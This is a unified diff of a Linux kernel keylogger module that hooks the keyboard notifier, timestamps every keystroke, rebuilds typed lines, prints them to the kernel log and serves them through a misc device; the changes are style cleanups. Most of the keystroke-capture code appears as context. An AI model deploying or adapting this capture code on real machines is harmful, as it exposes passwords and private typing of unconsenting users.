@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: GPL-3.0-only
 #include <linux/module.h>
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
@@ -57,54 +58,58 @@ static const char	*us_keymap[][2] = {
 	{"INSERT", "INSERT"}, {"DELETE", "DELETE"}, {"\0", "\0"}, {"\0", "\0"},
 	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
 	{"PAUSE", "PAUSE"},
-}; 
+};
 
-static size_t			captured_size = 0;
-static size_t			captured_max_size = 0;
-static struct key_stroke	*captured_keys = NULL;
-static char			*log_file = NULL;
+static size_t			captured_size;
+static size_t			captured_max_size;
+static struct key_stroke	*captured_keys;
+static char			*log_file;
 static struct mutex		log_mutex; // for log_file
 static struct mutex		keys_mutex; // for captured_keys
 
 static int	ktime_to_hours(ktime_t time)
 {
 	int	hours;
+
 	hours = time / 1000000000; // seconds
 	hours /= 60; // minutes
 	hours /= 60; // hours
 	hours = hours % 24;
-	return (hours);
+	return hours;
 }
 
 static int	ktime_to_minutes(ktime_t time)
 {
 	int	minutes;
+
 	minutes = time / 1000000000; // seconds
 	minutes /= 60; // minutes
 	minutes = minutes % 60;
-	return (minutes);
+	return minutes;
 }
 
 static int	ktime_to_seconds(ktime_t time)
 {
 	int	seconds;
+
 	seconds = time / 1000000000; // seconds
 	seconds = seconds % 60; // minutes
-	return (seconds);
+	return seconds;
 }
 
 static void	key_stroke_to_buffer(struct key_stroke entry, char *buffer,
-								size_t len)
+					size_t len)
 {
 	int	hours;
 	int	minutes;
 	int	seconds;
 	char	format[] = "[%2d:%02d:%02d] %s (%d) %s\n";
+
 	hours = ktime_to_hours(entry.time);
 	minutes = ktime_to_minutes(entry.time);
 	seconds = ktime_to_seconds(entry.time);
 	snprintf(buffer, len, format, hours, minutes, seconds, entry.full_name,
-		entry.keycode, (entry.pressed ? "Pressed": "Released"));
+		entry.keycode, (entry.pressed ? "Pressed" : "Released"));
 }
 
 static int	handle_keycode(struct keyboard_notifier_param *param)
@@ -112,10 +117,12 @@ static int	handle_keycode(struct keyboard_notifier_param *param)
 	mutex_lock(&keys_mutex);
 	if (captured_size == captured_max_size) {
 		captured_keys = krealloc_array(captured_keys,
-		captured_max_size * 2, sizeof(struct key_stroke), GFP_KERNEL);
+						captured_max_size * 2,
+						sizeof(struct key_stroke),
+						GFP_KERNEL);
 		if (!captured_keys) {
 			mutex_unlock(&keys_mutex);
-			return (NOTIFY_BAD);
+			return NOTIFY_BAD;
 		}
 		captured_max_size *= 2;
 	}
@@ -123,13 +130,14 @@ static int	handle_keycode(struct keyboard_notifier_param *param)
 	captured_keys[captured_size].pressed = param->down;
 	captured_keys[captured_size].time = ktime_get_real();
 	mutex_unlock(&keys_mutex);
-	return (NOTIFY_OK);
+	return NOTIFY_OK;
 }
 
 static int	handle_keysym(struct keyboard_notifier_param *param)
 {
 	char	c;
 	int	shift = 0;
+
 	if (param->shift == 1)
 		shift = 1;
 	c = param->value;
@@ -137,7 +145,7 @@ static int	handle_keysym(struct keyboard_notifier_param *param)
 	captured_keys[captured_size].keysym = c;
 	if (c >= 33 && c <= 126) {
 		snprintf(captured_keys[captured_size].full_name, FULL_NAME_SIZE,
-								"%c", c);
+			"%c", c);
 	} else {
 		strscpy(captured_keys[captured_size].full_name,
 			us_keymap[captured_keys[captured_size].keycode][shift],
@@ -145,17 +153,17 @@ static int	handle_keysym(struct keyboard_notifier_param *param)
 	}
 	captured_size++;
 	mutex_unlock(&keys_mutex);
-	return (NOTIFY_OK);
+	return NOTIFY_OK;
 }
 
 static int	key_pressed(struct notifier_block *self, unsigned long action,
-								void *data)
+				void *data)
 {
 	if (action == KBD_KEYCODE)
-		return (handle_keycode(data));
+		return handle_keycode(data);
 	else if (action == KBD_KEYSYM)
-		return (handle_keysym(data));
-	return (NOTIFY_DONE);
+		return handle_keysym(data);
+	return NOTIFY_DONE;
 }
 
 static struct notifier_block	nb = {
@@ -166,16 +174,17 @@ static struct notifier_block	nb = {
 
 static int	next_return(int start)
 {
-	while (start < captured_size && ((captured_keys[start].keycode != 96
-					&& captured_keys[start].keycode != 28)
-					|| !captured_keys[start].pressed))
+	while (start < captured_size && ((captured_keys[start].keycode != 96 &&
+					captured_keys[start].keycode != 28) ||
+					!captured_keys[start].pressed))
 		start++;
-	return (start);
+	return start;
 }
 
 static void	fill_line(char *line, int start, int end)
 {
 	int	i = 0;
+
 	while (start < end) {
 		if (captured_keys[start].keysym >= 32
 				&& captured_keys[start].keysym <= 126
@@ -193,13 +202,14 @@ static void	print_readable(void)
 	int	start = 0;
 	int	end = 0;
 	char	*line = NULL;
+
 	pr_info("Full readable logs:");
 	while (end < captured_size) {
 		end = next_return(start);
 		line = kmalloc(end - start + 1, GFP_KERNEL);
 		if (!line) {
 			pr_err("%s: kmalloc error", MODULE_NAME);
-			return ;
+			return;
 		}
 		fill_line(line, start, end);
 		if (strlen(line))
@@ -210,16 +220,17 @@ static void	print_readable(void)
 	}
 }
 
-static ssize_t 	logs_read(struct file *filp, char __user *buffer, size_t len,
-							loff_t *offset)
+static ssize_t	logs_read(struct file *filp, char __user *buffer, size_t len,
+				loff_t *offset)
 {
 	int	ret = 0;
+
 	mutex_lock(&log_mutex);
 	if (log_file)
 		ret = simple_read_from_buffer(buffer, len, offset, log_file,
-							strlen(log_file));
-	mutex_unlock(&log_mutex);	
-	return (ret);
+						strlen(log_file));
+	mutex_unlock(&log_mutex);
+	return ret;
 }
 
 static int	logs_open(struct inode *inode, struct file *file)
@@ -227,6 +238,7 @@ static int	logs_open(struct inode *inode, struct file *file)
 	int	log_len;
 	char	line[LINE_SIZE];
 	int	i;
+
 	try_module_get(THIS_MODULE);
 	mutex_lock(&log_mutex);
 	kfree(log_file);
@@ -241,7 +253,7 @@ static int	logs_open(struct inode *inode, struct file *file)
 		if (!log_file) {
 			mutex_unlock(&log_mutex);
 			pr_err("%s: krealloc_array error\n", MODULE_NAME);
-			return (1);
+			return 1;
 		}
 		if (log_len == 0)
 			log_len = strscpy(log_file, line, strlen(line) + 1);
@@ -250,7 +262,7 @@ static int	logs_open(struct inode *inode, struct file *file)
 		i++;
 	}
 	mutex_unlock(&log_mutex);
-	return (0);
+	return 0;
 }
 
 static int	logs_close(struct inode *inode, struct file *file)
@@ -262,16 +274,16 @@ static int	logs_close(struct inode *inode, struct file *file)
 		mutex_unlock(&log_mutex);
 	}
 	module_put(THIS_MODULE);
-	return (0);
+	return 0;
 }
 
-static struct file_operations	logs_fops = {
+static const struct file_operations	logs_fops = {
 	.open = &logs_open,
 	.release = &logs_close,
 	.read = &logs_read,
 };
 
-static struct miscdevice	logs_device = {
+static const struct miscdevice	logs_device = {
 	.minor = MISC_DYNAMIC_MINOR,
 	.name = DEVICE_NAME,
 	.fops = &logs_fops
@@ -284,14 +296,15 @@ static int	__init kl_init(void)
 	ret = misc_register(&logs_device);
 	if (ret) {
 		pr_err("%s: Loading module failed\n", MODULE_NAME);
-		return (-ret);
+		return -ret;
 	}
 	pr_info("%s: Module loaded\n", MODULE_NAME);
 	ret = register_keyboard_notifier(&nb);
 	if (ret) {
 		misc_deregister(&logs_device);
-		pr_err("%s: Registering keyboard notifier failed\n", MODULE_NAME);
-		return (-ret);
+		pr_err("%s: Registering keyboard notifier failed\n",
+			MODULE_NAME);
+		return -ret;
 	}
 	captured_max_size = 10;
 	captured_keys = kmalloc_array(captured_max_size,
@@ -299,10 +312,10 @@ static int	__init kl_init(void)
 	if (!captured_keys) {
 		misc_deregister(&logs_device);
 		unregister_keyboard_notifier(&nb);
-		return (1);
+		return 1;
 	}
 	pr_info("%s: Keyboard notifier registered\n", MODULE_NAME);
-	return (0);
+	return 0;
 }
 
 static void	__exit kl_cleanup(void)
@@ -313,7 +326,7 @@ static void	__exit kl_cleanup(void)
 	kfree(captured_keys);
 	if (unregister_keyboard_notifier(&nb))
 		pr_err("%s: Error when unregistering keyboard notifier\n",
-								MODULE_NAME);
+			MODULE_NAME);
 	else
 		pr_info("%s: Keyboard notifier unregistered\n", MODULE_NAME);
 	pr_info("%s: Module unloaded\n", MODULE_NAME);
